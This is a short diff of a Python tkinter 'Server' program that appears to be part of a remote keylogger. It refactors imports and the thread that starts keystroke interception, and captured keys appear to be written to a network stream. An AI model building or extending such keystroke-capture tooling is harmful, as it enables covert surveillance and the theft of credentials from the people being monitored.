@@ -8,15 +8,8 @@ import io
 import tkinter as tk
 from tkinter import messagebox
 from threading import Thread
-from Keylog import KeyLogger
-
-
-class Program:
-    server = None
-    client = None
-    ns = None
-    nr = None
-    nw = None
+from Keylog import InterceptKeys
+from Program import Program
 
 class Server(tk.Tk):
     def __init__(self):
@@ -128,7 +121,7 @@ def print_keys():
     Program.nw.flush()
 
 def keylog():
-    tklog = threading.Thread(target=KeyLogger.InterceptKeys.startKLog)
+    tklog = threading.Thread(target=InterceptKeys.startKLog)
     s = ""
     tklog.start()
     tklog.suspend()
